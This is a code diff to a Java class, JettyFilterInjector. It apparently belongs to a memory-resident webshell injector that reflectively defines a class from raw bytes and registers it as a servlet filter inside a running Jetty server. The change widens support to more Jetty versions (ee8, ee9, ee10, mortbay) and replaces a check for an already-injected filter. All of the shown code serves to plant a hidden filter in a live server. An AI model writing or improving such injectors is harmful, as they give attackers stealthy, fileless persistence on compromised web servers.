@@ -50,17 +50,32 @@ public class JettyFilterInjector {
         if (servletHandler == null) {
             return;
         }
-        if (isInjected(servletHandler)) {
+        if (invokeMethod(servletHandler, "getFilter", new Class[]{String.class}, new Object[]{getClassName()}) != null) {
             System.out.println("filter is already injected");
             return;
         }
 
+        String[] classNames = new String[]{
+                "org.eclipse.jetty.servlet.FilterHolder",
+                "org.eclipse.jetty.ee8.servlet.FilterHolder",
+                "org.eclipse.jetty.ee9.servlet.FilterHolder",
+                "org.eclipse.jetty.ee10.servlet.FilterHolder",
+                "org.mortbay.jetty.servlet.FilterHolder",
+        };
+
         Class<?> filterHolderClass = null;
-        try {
-            filterHolderClass = context.getClass().getClassLoader().loadClass("org.eclipse.jetty.servlet.FilterHolder");
-        } catch (ClassNotFoundException e) {
-            filterHolderClass = context.getClass().getClassLoader().loadClass("org.mortbay.jetty.servlet.FilterHolder");
+
+        for (String className : classNames) {
+            try {
+                filterHolderClass = context.getClass().getClassLoader().loadClass(className);
+            } catch (ClassNotFoundException ignored) {
+            }
         }
+
+        if (filterHolderClass == null) {
+            throw new ClassNotFoundException("FilterHodler");
+        }
+
         Constructor<?> constructor = filterHolderClass.getConstructor(Class.class);
         Object filterHolder = constructor.newInstance(filter.getClass());
         invokeMethod(filterHolder, "setName", new Class[]{String.class}, new Object[]{getClassName()});
@@ -152,26 +167,6 @@ public class JettyFilterInjector {
             Class<?> clazz = (Class<?>) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
             return clazz.newInstance();
         }
-    }
-
-    public boolean isInjected(Object servletHandler) throws Exception {
-        Object filterMappings = getFieldValue(servletHandler, "_filterMappings");
-        if (filterMappings == null) {
-            return false;
-        }
-        Object[] filterMaps = new Object[0];
-        if (filterMappings instanceof List) {
-            filterMaps = ((List<?>) filterMappings).toArray();
-        } else if (filterMappings instanceof Object[]) {
-            filterMaps = (Object[]) filterMappings;
-        }
-        for (Object filterMap : filterMaps) {
-            Object filterName = getFieldValue(filterMap, "_filterName");
-            if (filterName.equals(getClassName())) {
-                return true;
-            }
-        }
-        return false;
     }
 
 
